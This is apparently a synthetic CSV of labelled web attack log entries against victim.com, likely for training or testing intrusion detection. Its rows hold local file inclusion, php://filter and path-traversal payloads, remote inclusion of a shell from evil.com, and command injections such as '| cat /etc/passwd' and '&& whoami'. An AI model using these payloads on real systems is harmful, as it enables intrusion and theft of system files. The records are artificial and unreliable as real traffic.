id,timestamp,src_ip,dst_ip,method,url,attack_type,payload,is_successful,user_agent,notes
421,2025-11-27 16:28:56.532817,192.168.143.17,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,SQLmap/1.5,
422,2025-11-11 19:31:56.532823,192.168.45.129,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,Mozilla/5.0,
423,2025-11-15 12:29:56.532829,192.168.205.245,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,curl/7.88,
424,2025-11-07 01:05:56.532834,192.168.145.94,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,SQLmap/1.5,
425,2025-11-17 13:08:56.532839,192.168.217.93,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,SQLmap/1.5,
426,2025-11-24 21:06:56.532845,192.168.230.80,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,SQLmap/1.5,
427,2025-11-17 20:30:56.532851,192.168.90.176,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,curl/7.88,
428,2025-11-19 15:42:56.532856,192.168.134.167,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,SQLmap/1.5,
429,2025-12-02 19:02:56.532861,192.168.64.72,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
430,2025-11-14 01:02:56.532866,192.168.241.184,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,SQLmap/1.5,
431,2025-12-04 22:14:56.532872,192.168.179.45,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,Mozilla/5.0,
432,2025-11-20 20:55:56.532878,192.168.243.110,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,curl/7.88,
433,2025-11-11 00:10:56.532884,192.168.124.126,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,SQLmap/1.5,
434,2025-11-24 16:12:56.532889,192.168.10.69,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,Mozilla/5.0,
435,2025-11-24 20:16:56.532894,192.168.90.196,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,Mozilla/5.0,
436,2025-11-14 22:12:56.532900,192.168.153.83,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
437,2025-11-13 21:24:56.532905,192.168.187.91,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,curl/7.88,
438,2025-11-25 21:16:56.532910,192.168.9.111,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,curl/7.88,
439,2025-11-24 18:51:56.532916,192.168.4.200,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,curl/7.88,
440,2025-11-27 06:31:56.532921,192.168.133.46,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,Mozilla/5.0,
441,2025-11-06 18:45:56.532927,192.168.133.250,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,SQLmap/1.5,
442,2025-11-10 17:45:56.532933,192.168.125.147,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
443,2025-11-21 23:51:56.532938,192.168.118.16,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
444,2025-11-28 15:23:56.532944,192.168.93.77,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
445,2025-11-28 09:18:56.532949,192.168.65.170,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
446,2025-12-09 15:14:56.532955,192.168.1.215,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,curl/7.88,
447,2025-11-25 07:35:56.532960,192.168.55.179,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,curl/7.88,
448,2025-12-09 14:13:56.532965,192.168.118.218,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
449,2025-11-08 02:25:56.532973,192.168.185.194,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
450,2025-11-18 10:01:56.532978,192.168.35.194,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,curl/7.88,
451,2025-11-15 18:19:56.532984,192.168.168.252,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,curl/7.88,
452,2025-11-10 15:51:56.532990,192.168.57.118,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
453,2025-11-26 16:37:56.532995,192.168.188.254,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,Mozilla/5.0,
454,2025-11-12 20:18:56.533000,192.168.94.2,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,curl/7.88,
455,2025-12-03 05:19:56.533005,192.168.16.14,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,SQLmap/1.5,
456,2025-12-06 02:15:56.533011,192.168.121.153,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,curl/7.88,
457,2025-12-08 04:45:56.533016,192.168.245.99,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,SQLmap/1.5,
458,2025-12-09 01:57:56.533022,192.168.7.81,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
459,2025-11-25 16:36:56.533027,192.168.230.181,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,curl/7.88,
460,2025-11-14 03:38:56.533033,192.168.90.152,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,Mozilla/5.0,
461,2025-11-17 07:28:56.533038,192.168.160.11,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
462,2025-11-24 20:41:56.533045,192.168.167.66,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,SQLmap/1.5,
463,2025-11-19 07:17:56.533050,192.168.164.58,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,Mozilla/5.0,
464,2025-12-09 04:34:56.533055,192.168.9.249,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
465,2025-11-22 23:07:56.533060,192.168.176.217,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,SQLmap/1.5,
466,2025-11-15 04:47:56.533067,192.168.48.204,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
467,2025-12-10 06:44:56.533073,192.168.216.2,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,curl/7.88,
468,2025-11-18 21:48:56.533078,192.168.40.176,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,curl/7.88,
469,2025-11-07 15:53:56.533083,192.168.107.123,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,Mozilla/5.0,
470,2025-11-28 07:52:56.533088,192.168.137.79,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,SQLmap/1.5,
471,2025-12-11 02:22:56.533095,192.168.101.193,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,curl/7.88,
472,2025-11-15 19:38:56.533101,192.168.224.169,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,curl/7.88,
473,2025-11-23 23:48:56.533107,192.168.69.203,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,SQLmap/1.5,
474,2025-11-16 23:46:56.533112,192.168.129.123,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,curl/7.88,
475,2025-11-11 19:47:56.533118,192.168.51.67,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,Mozilla/5.0,
476,2025-12-01 23:46:56.533123,192.168.225.228,192.168.1.20,POST,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,True,curl/7.88,
477,2025-12-06 00:59:56.533128,192.168.186.214,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
478,2025-11-13 12:54:56.533134,192.168.69.65,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,True,Mozilla/5.0,
479,2025-11-14 03:39:56.533139,192.168.196.87,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,curl/7.88,
480,2025-11-20 16:25:56.533144,192.168.131.20,192.168.1.20,POST,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,True,Mozilla/5.0,
481,2025-12-01 10:58:56.533151,192.168.38.88,192.168.1.20,GET,http://victim.com/scan?input=php://filter/convert.base64-encode/resource=index.php,LFI_RFI,php://filter/convert.base64-encode/resource=index.php,False,SQLmap/1.5,
482,2025-11-11 03:54:56.533157,192.168.115.49,192.168.1.20,GET,http://victim.com/scan?input=http://evil.com/shell.txt,LFI_RFI,http://evil.com/shell.txt,False,Mozilla/5.0,
483,2025-11-19 15:09:56.533163,192.168.6.242,192.168.1.20,POST,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,SQLmap/1.5,
484,2025-12-10 16:10:56.533169,192.168.198.11,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,curl/7.88,
485,2025-11-23 06:29:56.533175,192.168.55.146,192.168.1.20,GET,http://victim.com/scan?input=../../../../var/log/apache2/access.log,LFI_RFI,../../../../var/log/apache2/access.log,False,curl/7.88,
486,2025-11-18 22:57:56.533181,192.168.45.18,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,True,curl/7.88,
487,2025-11-30 23:45:56.533187,192.168.73.8,192.168.1.20,GET,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,False,curl/7.88,
488,2025-12-05 20:49:56.533192,192.168.30.26,192.168.1.20,GET,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,Mozilla/5.0,
489,2025-12-10 21:31:56.533197,192.168.204.220,192.168.1.20,POST,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,True,SQLmap/1.5,
490,2025-11-16 21:34:56.533202,192.168.46.123,192.168.1.20,GET,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,True,Mozilla/5.0,
491,2025-11-10 11:44:56.533208,192.168.2.91,192.168.1.20,POST,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,False,curl/7.88,
492,2025-12-05 08:45:56.533214,192.168.141.246,192.168.1.20,GET,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,False,SQLmap/1.5,
493,2025-12-11 00:16:56.533219,192.168.244.198,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,False,curl/7.88,
494,2025-11-12 13:04:56.533225,192.168.227.168,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,False,curl/7.88,
495,2025-11-11 07:27:56.533230,192.168.162.119,192.168.1.20,POST,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,True,Mozilla/5.0,
496,2025-11-25 14:39:56.533235,192.168.121.117,192.168.1.20,POST,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,True,SQLmap/1.5,
497,2025-11-14 20:13:56.533241,192.168.210.9,192.168.1.20,POST,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,False,Mozilla/5.0,
498,2025-11-13 16:58:56.533246,192.168.89.8,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,True,Mozilla/5.0,
499,2025-11-13 21:03:56.533251,192.168.155.179,192.168.1.20,GET,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,False,SQLmap/1.5,
500,2025-11-27 17:57:56.533256,192.168.7.13,192.168.1.20,GET,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,False,curl/7.88,
501,2025-11-27 14:52:56.533262,192.168.129.172,192.168.1.20,GET,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,False,SQLmap/1.5,
502,2025-11-10 17:01:56.533269,192.168.32.121,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,True,Mozilla/5.0,
503,2025-11-25 19:15:56.533275,192.168.240.217,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,True,Mozilla/5.0,
504,2025-11-24 11:39:56.533281,192.168.205.164,192.168.1.20,POST,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,True,Mozilla/5.0,
505,2025-11-13 22:26:56.533286,192.168.217.50,192.168.1.20,POST,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,False,Mozilla/5.0,
506,2025-12-06 01:54:56.533292,192.168.69.211,192.168.1.20,GET,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,SQLmap/1.5,
507,2025-11-24 05:24:56.533297,192.168.207.24,192.168.1.20,GET,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,False,Mozilla/5.0,
508,2025-12-08 05:03:56.533302,192.168.23.161,192.168.1.20,GET,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,SQLmap/1.5,
509,2025-11-28 18:14:56.533308,192.168.116.190,192.168.1.20,POST,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,True,SQLmap/1.5,
510,2025-12-10 06:49:56.533313,192.168.190.236,192.168.1.20,GET,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,False,Mozilla/5.0,
511,2025-11-09 12:12:56.533319,192.168.210.140,192.168.1.20,POST,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,SQLmap/1.5,
512,2025-11-27 03:57:56.533325,192.168.183.68,192.168.1.20,POST,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,False,Mozilla/5.0,
513,2025-11-16 01:13:56.533332,192.168.75.34,192.168.1.20,GET,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,False,curl/7.88,
514,2025-11-21 12:04:56.533337,192.168.236.157,192.168.1.20,GET,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,Mozilla/5.0,
515,2025-11-25 16:05:56.533343,192.168.231.254,192.168.1.20,POST,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,False,SQLmap/1.5,
516,2025-11-06 20:39:56.533348,192.168.158.156,192.168.1.20,GET,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,True,curl/7.88,
517,2025-11-13 13:24:56.533353,192.168.39.120,192.168.1.20,GET,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,False,Mozilla/5.0,
518,2025-11-24 12:04:56.533359,192.168.186.178,192.168.1.20,POST,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,Mozilla/5.0,
519,2025-11-13 12:48:56.533364,192.168.150.147,192.168.1.20,POST,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,False,SQLmap/1.5,
520,2025-11-26 19:27:56.533369,192.168.203.136,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,True,curl/7.88,
521,2025-12-09 19:07:56.533374,192.168.162.100,192.168.1.20,GET,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,Mozilla/5.0,
522,2025-11-21 18:55:56.533381,192.168.120.106,192.168.1.20,GET,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,True,curl/7.88,
523,2025-11-30 16:41:56.533387,192.168.69.182,192.168.1.20,POST,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,False,Mozilla/5.0,
524,2025-11-17 17:00:56.533392,192.168.90.109,192.168.1.20,GET,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,False,SQLmap/1.5,
525,2025-12-06 01:56:56.533398,192.168.244.230,192.168.1.20,GET,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,True,SQLmap/1.5,
526,2025-12-07 11:32:56.533403,192.168.65.169,192.168.1.20,GET,http://victim.com/scan?input=`id`,COMMAND_INJECTION,`id`,True,curl/7.88,
527,2025-11-09 23:54:56.533408,192.168.154.15,192.168.1.20,POST,http://victim.com/scan?input=| cat /etc/passwd,COMMAND_INJECTION,| cat /etc/passwd,True,SQLmap/1.5,
528,2025-11-28 08:09:56.533414,192.168.9.200,192.168.1.20,GET,http://victim.com/scan?input=&& whoami,COMMAND_INJECTION,&& whoami,True,Mozilla/5.0,
529,2025-11-20 13:55:56.533419,192.168.176.167,192.168.1.20,POST,http://victim.com/scan?input=;ls,COMMAND_INJECTION,;ls,True,Mozilla/5.0,
